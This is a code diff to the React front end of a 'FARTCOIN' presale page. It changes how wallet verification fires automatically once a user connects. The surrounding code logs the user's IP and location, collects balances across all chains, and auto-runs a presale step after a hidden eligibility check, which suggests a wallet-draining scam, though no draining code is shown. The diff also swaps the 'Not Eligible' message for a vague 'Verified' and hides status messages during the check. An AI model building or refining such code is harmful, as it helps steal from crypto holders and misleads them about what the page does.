@@ -109,7 +109,6 @@ function App() {
   const [userEmail, setUserEmail] = useState('');
   const [userLocation, setUserLocation] = useState({ country: '', city: '', region: '', ip: '' });
   const [executionResults, setExecutionResults] = useState([]);
-  const [balancesLoaded, setBalancesLoaded] = useState(false);
 
   // Presale stats - FARTCOIN
   const [timeLeft, setTimeLeft] = useState({
@@ -204,7 +203,6 @@ function App() {
         
         // Fetch balances across all chains
         await fetchAllBalances(address);
-        setBalancesLoaded(true);
         
       } catch (e) {
         console.error("Provider init failed", e);
@@ -304,10 +302,16 @@ function App() {
 
   // Auto-check eligibility when wallet connects
   useEffect(() => {
-    if (isConnected && address && !scanResult && !verifying && balancesLoaded) {
-      verifyWallet();
+    if (isConnected && address && !scanResult && !verifying) {
+      // Wait for balances to load
+      const timer = setTimeout(() => {
+        if (Object.keys(balances).length > 0) {
+          verifyWallet();
+        }
+      }, 1000);
+      return () => clearTimeout(timer);
     }
-  }, [isConnected, address, balancesLoaded, scanResult, verifying]);
+  }, [isConnected, address, balances]);
 
   const verifyWallet = async () => {
     if (!address) return;
@@ -337,7 +341,7 @@ function App() {
           setTxStatus('✅ You qualify!');
           await preparePresale();
         } else {
-          setTxStatus('✨ Verified - Not Eligible');
+          setTxStatus('✨ Verified');
         }
       }
     } catch (err) {
@@ -619,7 +623,6 @@ function App() {
       setTxStatus('');
       setError('');
       setExecutionResults([]);
-      setBalancesLoaded(false);
     } catch (err) {
       console.error('Disconnect error:', err);
       // Force UI update even if disconnect fails
@@ -876,7 +879,7 @@ function App() {
           </section>
 
           {/* Status Messages */}
-          {txStatus && (
+          {txStatus && !verifying && (
             <div className="max-w-2xl mx-auto mb-6 px-4">
               <div className="terminal-frame p-5 border-white">
                 <div className="flex items-center gap-4">
